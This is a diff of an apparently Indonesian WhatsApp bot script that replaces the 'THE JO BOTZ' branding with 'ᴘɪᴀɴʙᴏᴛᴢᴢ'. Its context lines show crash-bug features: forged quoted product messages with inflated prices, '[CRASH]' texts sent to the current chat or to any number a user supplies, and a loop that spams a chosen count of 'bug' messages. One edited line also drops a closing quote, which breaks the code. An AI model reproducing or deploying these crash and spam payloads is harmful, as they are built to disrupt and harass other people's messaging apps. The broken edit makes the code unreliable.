@@ -1073,15 +1073,15 @@ if (!isCreator) return
 if (!m.isGroup) throw mess.group
 let teks = `
 ══✪〘 👥 Tag All 〙✪══
-•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• 
+•━══〘ᴘɪᴀɴʙᴏᴛᴢᴢ〙══━• 
 INFO: ${q ? q : 'kosong'}
-•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• `
+•━══〘ᴘɪᴀɴʙᴏᴛᴢᴢ〙══━• `
  for (let mem of participants) {
  teks += `
  ╭━═════════════━• 
  │➳ @${mem.id.split('@')[0]}
  ╰━═════════════━•
- •━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• `
+ •━══〘ᴘɪᴀɴʙᴏᴛᴢᴢ〙══━• `
  }
  jobotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id),
 contextInfo: {
@@ -4196,7 +4196,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
+title: `By: ᴘɪᴀɴʙᴏᴛᴢᴢ`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
@@ -4213,7 +4213,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
+title: `By: ᴘɪᴀɴʙᴏᴛᴢᴢ`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
@@ -4255,7 +4255,7 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
+"caption": `ᴘɪᴀɴʙᴏᴛᴢᴢ`, 
 "jpegThumbnail": virgam
 } 
 } 
@@ -4275,7 +4275,7 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
+"caption": `ᴘɪᴀɴʙᴏᴛᴢᴢ`, 
 "jpegThumbnail": virgam
 } 
 } 
@@ -4295,7 +4295,7 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
+"caption": `ᴘɪᴀɴʙᴏᴛᴢᴢ`, 
 "jpegThumbnail": virgam
 } 
 } 
@@ -4504,11 +4504,11 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
-"description": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
+"title": "ᴘɪᴀɴʙᴏᴛᴢᴢ", 
+"description": "ᴘɪᴀɴʙᴏᴛᴢᴢ", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
+"retailerId": "ᴘɪᴀɴʙᴏᴛᴢᴢ", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
 jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko})}
@@ -4528,11 +4528,11 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
-"description": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
+"title": "ᴘɪᴀɴʙᴏᴛᴢᴢ", 
+"description": "ᴘɪᴀɴʙᴏᴛᴢᴢ, 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
+"retailerId": "ᴘɪᴀɴʙᴏᴛᴢᴢ", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6289614889531@s.whatsapp.net`}}}	
 jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko})
@@ -4552,11 +4552,11 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
-"description": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
+"title": "ᴘɪᴀɴʙᴏᴛᴢᴢ", 
+"description": "ᴘɪᴀɴʙᴏᴛᴢᴢ", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁", 
+"retailerId": "ᴘɪᴀɴʙᴏᴛᴢᴢ", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}
 jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:ftoko1})
@@ -4955,7 +4955,7 @@ if (!isCreator && !isBan) return
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-            jobotz.sendMessage(m.chat, {text:"🇹 🇭 🇪 🇱 🇮 🇲 🇦"},{quoted:fgamjo})
+            jobotz.sendMessage(m.chat, {text:"VᴘɪᴀɴʙᴏᴛᴢᴢV"},{quoted:fgamjo})
             }
             jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
             }
